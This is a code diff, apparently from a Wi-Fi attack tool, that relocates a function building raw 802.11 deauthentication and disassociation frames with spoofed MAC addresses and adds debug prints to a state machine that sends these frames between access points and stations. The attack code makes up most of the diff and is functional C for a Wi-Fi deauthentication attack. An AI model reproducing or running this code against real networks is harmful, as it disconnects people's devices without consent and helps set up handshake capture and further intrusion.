@@ -30,7 +30,7 @@ struct packet
 int send_packet(uchar *buf, size_t count)
 {
     printf("\nsending_packet\n");
-    print_packet(buf, count);
+    //print_packet(buf, count);
     struct wif *wi = _wi_out; /* XXX */
     if (wi_write(wi, buf, count, NULL) == -1) {
         switch (errno) {
@@ -78,33 +78,6 @@ void print_mac(const uchar* mac) {
         printf("%02X", mac[i]);
     }
     printf("\n");
-}
-
-struct packet create_deauth_frame(uchar *mac_source, uchar *mac_destination, uchar *mac_bssid, int disassoc)
-{
-    // Generating deauthenticationor disassociation frame
-
-    struct packet result_packet;
-    uchar packet_data[MAX_PACKET_LENGTH];
-                                     //Destination           //Source
-    char *header =  "\xc0\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-                    //BSSID                  //SEQ //REASON
-                    "\x00\x00\x00\x00\x00\x00\x70\x6a\x01\x00";
-
-    memcpy(packet_data, header, 25);
-    if (disassoc)
-    {
-        packet_data[0] = '\xa0';
-    }
-    // Set target Dest, Src, BSSID
-    memcpy(packet_data + 4, mac_destination, MAC_LENGTH);
-    memcpy(packet_data + 10, mac_source, MAC_LENGTH);
-    memcpy(packet_data + 16, mac_bssid, MAC_LENGTH);
-
-    result_packet.length = 26;
-    result_packet.data = packet_data;
-
-    return result_packet;
 }
 
 /* FIXME: should be refactored */
@@ -178,6 +151,41 @@ void print_packet(uchar *h80211, int buffer_size)
 
     printf("\n");
 }
+
+struct packet create_deauth_frame(uchar *mac_source, uchar *mac_destination, uchar *mac_bssid, int disassoc)
+{
+    // Generating deauthenticationor disassociation frame
+
+    struct packet result_packet;
+    uchar packet_data[MAX_PACKET_LENGTH];
+                                     //Destination           //Source
+    char *header =  "\xc0\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                    //BSSID                  //SEQ //REASON
+                    "\x00\x00\x00\x00\x00\x00\x70\x6a\x01\x00";
+
+    memcpy(packet_data, header, 25);
+    if (disassoc)
+    {
+        packet_data[0] = '\xa0';
+    }
+    // Set target Dest, Src, BSSID
+    memcpy(packet_data + 4, mac_destination, MAC_LENGTH);
+    memcpy(packet_data + 10, mac_source, MAC_LENGTH);
+    memcpy(packet_data + 16, mac_bssid, MAC_LENGTH);
+
+    result_packet.length = 26;
+    result_packet.data = packet_data;
+    printf("/n----- create_deauth_frame -----/n");
+    printf("mac_destination: ");
+    print_mac(mac_destination);
+    printf("mac_source: ");
+    print_mac(mac_source);
+    printf("mac_bssid: ");
+    print_mac(mac_bssid);
+    printf("/n-------------------------------/n");
+    return result_packet;
+}
+
 
 //Returns pointer to the desired MAC Adresses inside a packet
 //Type: s => Station
@@ -490,15 +498,19 @@ struct packet get_deauth_packet(int *state, uchar *bssid)
     print_mac(mac_access_point);
     printf("mac_station: ");
     print_mac(mac_station);
-
     switch (*state)
     {
     case 0:
+        printf("\nstate before: %d\n", *state);
+        printf("\nis_wds: %d\n", is_wds);
+
         *state = 1;
         result_packet = create_deauth_frame(mac_access_point, mac_station, mac_bssid, 1);
         send_packet(result_packet.data, result_packet.length);
+        printf("\nstate after: %d\n", *state);
     case 1:
-        printf("\nstate: %d\n", *state);
+        printf("\nstate before: %d\n", *state);
+        printf("\nis_wds: %d\n", is_wds);
         *state = 2;
         if (is_wds)
         {
@@ -506,26 +518,35 @@ struct packet get_deauth_packet(int *state, uchar *bssid)
         }
         result_packet = create_deauth_frame(mac_access_point, mac_station, mac_bssid, 0);
         send_packet(result_packet.data, result_packet.length);
+        printf("\nstate after: %d\n", *state);
     case 2:
-        printf("\nstate: %d\n", *state);
+        printf("\nstate before: %d\n", *state);
+        printf("\nis_wds: %d\n", is_wds);
         *state = 3;
         result_packet = create_deauth_frame(mac_station, mac_access_point, mac_bssid, 1);
         send_packet(result_packet.data, result_packet.length);
+        printf("\nstate after: %d\n", *state);
     case 3:
-        printf("\nstate: %d\n", *state);
+        printf("\nstate before: %d\n", *state);
+        printf("\nis_wds: %d\n", is_wds);
         *state = 0;
         result_packet = create_deauth_frame(mac_station, mac_access_point, mac_bssid, 0);
         send_packet(result_packet.data, result_packet.length);
+        printf("\nstate after: %d\n", *state);
     case 4:
-        printf("\nstate: %d\n", *state);
+        printf("\nstate before: %d\n", *state);
+        printf("\nis_wds: %d\n", is_wds);
         *state = 5;
         result_packet = create_deauth_frame(mac_station, mac_bssid, mac_access_point, 1);
         send_packet(result_packet.data, result_packet.length);
+        printf("\nstate after: %d\n", *state);
     case 5:
-        printf("\nstate: %d\n", *state);
+        printf("\nstate before: %d\n", *state);
+        printf("\nis_wds: %d\n", is_wds);
         *state = 0;
         result_packet = create_deauth_frame(mac_station, mac_bssid, mac_access_point, 0);
         send_packet(result_packet.data, result_packet.length);
+        printf("\nstate after: %d\n", *state);
     }
 
     free(sniffed_packet_data);
